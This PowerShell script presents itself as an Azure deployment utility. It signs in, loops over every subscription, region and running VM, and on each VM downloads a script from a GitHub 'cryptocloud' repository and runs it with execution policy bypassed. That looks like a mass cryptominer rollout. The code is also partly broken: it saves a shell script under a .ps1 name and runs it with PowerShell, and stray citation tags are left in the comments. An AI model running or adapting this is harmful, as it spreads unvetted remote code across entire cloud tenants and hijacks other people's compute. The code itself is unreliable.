<#
.SYNOPSIS
    Deploys a remote script to all VMs across all Azure subscriptions and regions
    
.DESCRIPTION
    This script connects to Azure, iterates through all accessible subscriptions,
    and executes a remote script on every Windows VM in every location.
    The target script is downloaded from: https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/refs/heads/master/Init.sh
    
.PARAMETER ScriptUrl
    URL of the script to deploy (defaults to the crypto cloud init script)
    
.NOTES
    Requires Azure PowerShell module and appropriate permissions
    Run on a machine with outbound internet access
#>

param(
    [string]$ScriptUrl = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/refs/heads/master/Init.sh"
)

# Function to execute script on a VM
function Invoke-RemoteScript {
    param(
        [string]$ResourceGroupName,
        [string]$VMName,
        [string]$ScriptContent,
        [PSCredential]$Credential
    )
    
    try {
        Write-Host "  Executing script on VM: $VMName" -ForegroundColor Cyan
        
        # For Windows VMs using Invoke-AzVMRunCommand
        $scriptBlock = @"
# Download and execute the script
`$scriptPath = "C:\Temp\InitScript.ps1"
Invoke-WebRequest -Uri "$ScriptUrl" -OutFile `$scriptPath -UseBasicParsing
powershell -ExecutionPolicy Bypass -File `$scriptPath
"@
        
        # Execute the command on the VM
        $result = Invoke-AzVMRunCommand -ResourceGroupName $ResourceGroupName `
            -VMName $VMName `
            -CommandId 'RunPowerShellScript' `
            -ScriptString $scriptBlock `
            -Credential $Credential `
            -ErrorAction Stop
            
        Write-Host "  Successfully executed on $VMName" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "  Failed to execute on $VMName : $_" -ForegroundColor Red
        return $false
    }
}

# Main execution
Write-Host "=== Starting Multi-Subscription VM Script Deployment ===" -ForegroundColor Yellow
Write-Host "Target Script: $ScriptUrl" -ForegroundColor Yellow
Write-Host ""

# Step 1: Connect to Azure
try {
    Write-Host "Step 1: Connecting to Azure..." -ForegroundColor Green
    Connect-AzAccount -ErrorAction Stop
    Write-Host "  Authentication successful" -ForegroundColor Green
}
catch {
    Write-Host "  Authentication failed: $_" -ForegroundColor Red
    exit 1
}

# Step 2: Get all subscriptions
Write-Host "`nStep 2: Retrieving all subscriptions..." -ForegroundColor Green
try {
    $allSubscriptions = Get-AzSubscription -ErrorAction Stop
    Write-Host "  Found $($allSubscriptions.Count) subscription(s)" -ForegroundColor Green
}
catch {
    Write-Host "  Failed to retrieve subscriptions: $_" -ForegroundColor Red
    exit 1
}

# Counters for reporting
$totalVMsProcessed = 0
$totalVMsSuccessful = 0
$subscriptionsProcessed = 0

# Step 3: Iterate through each subscription
foreach ($subscription in $allSubscriptions) {
    $subscriptionsProcessed++
    Write-Host "`n--- Processing Subscription: $($subscription.Name) ($($subscription.Id)) ---" -ForegroundColor Magenta
    
    try {
        # Set the current subscription context [citation:2][citation:3]
        Set-AzContext -Subscription $subscription.Id -ErrorAction Stop | Out-Null
        
        # Get all locations available in this subscription
        $locations = Get-AzLocation | Select-Object -ExpandProperty Location
        
        # Process each location
        foreach ($location in $locations) {
            Write-Host "  Location: $location" -ForegroundColor Cyan
            
            # Get all VMs in this subscription (across all locations)
            # Note: We filter by location in the loop to handle each region
            $vms = Get-AzVM -Status -ErrorAction SilentlyContinue | Where-Object { $_.Location -eq $location }
            
            if ($vms.Count -eq 0) {
                Write-Host "    No VMs found in this location" -ForegroundColor Gray
                continue
            }
            
            Write-Host "    Found $($vms.Count) VM(s)" -ForegroundColor Cyan
            
            # Process each VM
            foreach ($vm in $vms) {
                $totalVMsProcessed++
                Write-Host "    VM: $($vm.Name) (RG: $($vm.ResourceGroupName))" -ForegroundColor White
                
                # Check VM power state
                $vmStatus = $vm.Statuses | Where-Object { $_.Code -like "PowerState/*" }
                $powerState = $vmStatus.Code.Split('/')[1]
                
                if ($powerState -ne "running") {
                    Write-Host "      Skipping - VM is not running ($powerState)" -ForegroundColor Yellow
                    continue
                }
                
                Write-Host "      VM is running, proceeding with deployment..." -ForegroundColor Green
                
                # Get VM credentials (you may need to adjust this based on your setup)
                # For production, consider using Azure Key Vault for credentials
                $cred = Get-Credential -Message "Enter credentials for VM $($vm.Name)" -UserName "adminuser"
                
                if (-not $cred) {
                    Write-Host "      Skipping - No credentials provided" -ForegroundColor Yellow
                    continue
                }
                
                # Execute the script on the VM
                $success = Invoke-RemoteScript -ResourceGroupName $vm.ResourceGroupName `
                    -VMName $vm.Name `
                    -ScriptContent $null `
                    -Credential $cred
                
                if ($success) {
                    $totalVMsSuccessful++
                }
                
                # Small delay to avoid throttling
                Start-Sleep -Seconds 2
            }
        }
    }
    catch {
        Write-Host "  Error processing subscription $($subscription.Name): $_" -ForegroundColor Red
        continue
    }
}

# Final summary
Write-Host "`n=== Deployment Summary ===" -ForegroundColor Yellow
Write-Host "Subscriptions processed: $subscriptionsProcessed/$($allSubscriptions.Count)" -ForegroundColor Cyan
Write-Host "Total VMs found: $totalVMsProcessed" -ForegroundColor Cyan
Write-Host "Successfully deployed to: $totalVMsSuccessful VMs" -ForegroundColor Green
Write-Host "Failed: $($totalVMsProcessed - $totalVMsSuccessful) VMs" -ForegroundColor Red
Write-Host "`nScript deployment completed!" -ForegroundColor Yellow 
